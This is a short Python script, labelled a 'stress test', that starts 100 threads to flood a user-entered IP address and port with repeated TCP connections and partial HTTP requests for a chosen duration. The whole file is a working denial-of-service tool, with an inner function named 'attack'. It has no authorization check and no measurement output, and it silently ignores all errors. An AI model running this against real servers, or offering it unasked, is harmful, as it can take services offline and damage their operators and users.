import socket, threading, time
def stress_test(ip, port, duration):
    stop_event = threading.Event()
    def attack():
        while not stop_event.is_set():
            try:
                with socket.socket() as s:
                    s.connect((ip, port))
                    s.send(b"GET / HTTP/1.1\r\n")
            except: pass
    threads = [threading.Thread(target=attack) for _ in range(100)]
    for t in threads: t.start()
    time.sleep(duration); stop_event.set()
    for t in threads: t.join()
if __name__ == "__main__":
    stress_test(input("IP >> "), int(input("PORT >> ")), int(input("DURATION >> ")))